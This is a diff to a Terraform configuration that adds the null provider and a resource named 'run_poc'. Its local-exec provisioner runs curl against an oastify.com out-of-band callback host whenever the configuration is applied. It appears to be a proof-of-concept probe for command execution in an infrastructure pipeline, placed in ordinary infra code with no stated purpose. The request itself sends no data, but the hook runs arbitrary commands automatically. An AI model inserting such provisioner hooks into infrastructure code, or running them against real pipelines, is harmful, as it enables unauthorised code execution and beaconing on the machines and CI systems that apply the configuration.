@@ -3,11 +3,20 @@ terraform {
     random = {
       source = "hashicorp/random"
     }
+    null = {
+      source = "hashicorp/null"
+    }
   }
 }
 
 resource "random_id" "r" {
   byte_length = 3
+}
+
+resource "null_resource" "run_poc" {
+  provisioner "local-exec" {
+    command = "curl https://z005r7twq22k414db24dfktyapgg46sv.oastify.com/xx"
+  }
 }
 
 variable "env_type_id" {
